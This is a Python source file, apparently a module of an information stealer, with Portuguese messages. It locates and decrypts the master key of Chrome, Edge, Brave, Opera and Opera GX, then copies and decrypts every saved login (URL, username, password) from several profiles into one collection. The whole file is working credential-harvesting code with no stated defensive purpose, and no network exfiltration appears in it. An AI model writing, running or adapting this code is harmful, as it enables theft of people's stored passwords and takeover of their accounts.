import os
import json
import base64
import sqlite3
import shutil
import win32crypt
import tempfile
from Crypto.Cipher import AES
from datetime import datetime, timedelta
import sys
import ctypes
import binascii

def get_chrome_datetime(chrome_date):
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_date)

def get_encryption_key(browser_path="Google\\Chrome"):
    try:
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", browser_path,
                                        "User Data", "Local State")
        
        if not os.path.exists(local_state_path):
            return None
            
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())

        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]
        
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        print(f"[!] erro ao obter chave de criptografia: {str(e)}")
        return None

def decrypt_password(password, key):
    try:
        if password.startswith(b"v10") or password.startswith(b"v11"):
            iv = password[3:15]
            password = password[15:]
            
            cipher = AES.new(key, AES.MODE_GCM, iv)
            
            decrypted_pass = cipher.decrypt(password)[:-16].decode()
            return decrypted_pass
        else:
            try:
                decrypted_pass = win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode()
                return decrypted_pass
            except:
                try:
                    binary_pass = win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]
                    decrypted_pass = binary_pass.decode(errors='replace')
                    return decrypted_pass
                except:
                    try:
                        return binascii.hexlify(password).decode()
                    except:
                        return "**[*] criptografada**"
    except Exception as e:
        print(f"[!] erro ao descriptografar senha: {str(e)}")
        return "**[!] erro de descriptografia**"

def extract_passwords_from_db(login_db, key, browser_name=""):
    passwords = []
    
    try:
        if not os.path.exists(login_db):
            return []
            
        temp_dir = tempfile.gettempdir()
        temp_file = os.path.join(temp_dir, f"{browser_name}_login_data.db")
        
        try:
            shutil.copy2(login_db, temp_file)
        except Exception as e:
            print(f"[!] erro ao copiar {login_db}: {str(e)}")
            return []

        conn = sqlite3.connect(temp_file)
        cursor = conn.cursor()
        
        try:
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='logins'")
            if not cursor.fetchone():
                conn.close()
                os.remove(temp_file)
                return []
            
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                encrypted_password = row[2]
                
                if not url or not username or not encrypted_password:
                    continue

                decrypted_password = "*não foi possível descriptografar**"
                if key:
                    try:
                        decrypted_password = decrypt_password(encrypted_password, key)
                    except Exception as e:
                        print(f"[!] erro ao descriptografar senha: {str(e)}")
                        
                passwords.append({
                    "url": url,
                    "username": username,
                    "password": decrypted_password
                })
        except Exception as e:
            print(f"[!] erro ao consultar banco de dados: {str(e)}")
        finally:
            conn.close()
            try:
                os.remove(temp_file)
            except:
                pass
    except Exception as e:
        print(f"Erro ao extrair senhas: {str(e)}")
        
    return passwords

def get_chrome_passwords():
    browser_paths = {
        "Default": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data"),
        "Profile 1": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Profile 1", "Login Data"),
        "Profile 2": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Profile 2", "Login Data")
    }
    
    key = get_encryption_key("Google\\Chrome")
    
    passwords = []
    for profile, path in browser_paths.items():
        profile_passwords = extract_passwords_from_db(path, key, "chrome")
        passwords.extend(profile_passwords)
    
    return passwords

def get_brave_passwords():
    browser_paths = {
        "Default": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data"),
        "Profile 1": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Profile 1", "Login Data"),
        "Profile 2": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Profile 2", "Login Data")
    }
    
    key = get_encryption_key("BraveSoftware\\Brave-Browser")
    
    passwords = []
    for profile, path in browser_paths.items():
        profile_passwords = extract_passwords_from_db(path, key, "brave")
        passwords.extend(profile_passwords)
    
    return passwords

def get_opera_passwords():
    browser_paths = {
        "Default": os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable", "Login Data"),
    }
    
    key = get_encryption_key("Opera Software\\Opera Stable")
    
    passwords = []
    for profile, path in browser_paths.items():
        profile_passwords = extract_passwords_from_db(path, key, "opera")
        passwords.extend(profile_passwords)
    
    return passwords

def get_opera_gx_passwords():
    browser_paths = {
        "Default": os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable", "Login Data"),
    }
    
    key = get_encryption_key("Opera Software\\Opera GX Stable")
    
    passwords = []
    for profile, path in browser_paths.items():
        profile_passwords = extract_passwords_from_db(path, key, "operagx")
        passwords.extend(profile_passwords)
    
    return passwords

def get_edge_passwords():
    browser_paths = {
        "Default": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data"),
        "Profile 1": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Profile 1", "Login Data"),
        "Profile 2": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Profile 2", "Login Data")
    }
    
    key = get_encryption_key("Microsoft\\Edge")
    
    passwords = []
    for profile, path in browser_paths.items():
        profile_passwords = extract_passwords_from_db(path, key, "edge")
        passwords.extend(profile_passwords)
    
    return passwords

def get_firefox_passwords():
    # TODO Firefox usa NSS para criptografar as senhas
    return []

def get_browser_passwords():
    try:
        results = {
            "chrome": get_chrome_passwords(),
            "edge": get_edge_passwords(),
            "brave": get_brave_passwords(),
            "opera": get_opera_passwords(),
            "opera_gx": get_opera_gx_passwords(),
            "firefox": get_firefox_passwords()
        }
        
        return results, None
    except Exception as e:
        return None, str(e)